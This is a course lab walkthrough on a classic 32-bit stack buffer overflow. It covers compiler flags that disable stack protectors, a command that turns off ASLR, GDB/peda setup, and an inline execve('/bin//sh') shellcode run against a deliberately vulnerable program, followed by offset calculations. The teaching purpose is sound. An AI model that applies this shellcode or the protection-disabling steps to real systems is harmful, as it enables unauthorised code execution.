# Lab6

Learn to do a good old overflow.

## Files

* shell.c - a simple example of running a shell code from memory
* vulnerable.c - first version of the program
* mystack.c - the program that will be exploited, same as vulnerable.c, but has
a timeout to allow us to inspect the memory wit `gdb`


## Preparations

### Compilation

The flags are set on the Makefil.

To binary is for 32bit arch, no stack protectors, and executable memory on stack

* `-m32` -> compile for 32bit arch
* `-fno-stack-procetor` -> disable stack guards and whatever
* `-z execstack` -> no W^X limits, any memmory page can be executed

### ASLR

Turn of addres space randomization layout thing

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

This will keep the same memory address for our variables and buffers


### Debugger

Use GDB, but with the "[peda](https://github.com/longld/peda.git)" estension.

Installation:

```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```


## The script

Use `make mys` to compile the program, make sure the lines for the `while` loop
are NOT commented

```
./mys $(python2 -c 'print ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" +"A"*7)')
```

From another terminal run `gdb attach $(which mys)`

Create a break point at the line with `strcpy` e.g. `break mystack.c:14`
Type `continue`

After all the timeout we can look at the *buffer* address `p &buffer`
as well as the EBP address

```
EBP: 0xffffcfd8 --> 0xffffcff8 --> 0x0
$1 = (char (*)[32]) 0xffffcfb0
```

### Values

first run:

EBP: 0xffffcfd8 --> 0xffffcff8 --> 0x0
$1 = (char (*)[32]) 0xffffcfb0

CFD8 - CFB0 = 40 
40 - 32 = 8 padding

second run:

EBP: 0xffffcfb8 --> 0xffffcfd8 --> 0x0
$1 = (char (*)[32]) 0xffffcf90

CFB8 - CF90 = 40
